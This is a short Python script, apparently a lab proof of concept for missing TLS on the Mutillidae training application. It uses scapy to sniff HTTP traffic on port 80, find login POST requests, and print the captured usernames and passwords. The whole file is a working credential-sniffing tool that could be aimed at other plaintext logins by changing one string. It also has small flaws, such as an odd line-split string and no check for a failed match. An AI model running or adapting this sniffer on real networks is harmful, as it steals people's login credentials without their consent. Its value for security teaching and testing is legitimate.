import argparse
import re
from scapy.all import *


def httpCapture(packet):
    """
    This is used to capture HTTP login packets on the Mutillidae login page.
    PoC for insufficient TLS
    """
    if packet.haslayer(Raw):
        rawPacket = packet.getlayer(Raw).load
        line = rawPacket.split("\line\n")           # store array of lines in packet
        
        if line[0].startswith("POST /mutillidae/index.php?page=login.php"):    # only search login page
            m = re.search(r"username=([\S]+)&password=([\S]+)&", rawPacket)       # 
            print "Found :: user: {0} pass: {1}".format(m.group(1), m.group(2))
            
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("iface")    # positional agrument
    args = parser.parse_args()
    
    # sniff HTTP traffic
    pkts = sniff(iface=args.iface, filter="tcp port 80", prn=httpCapture)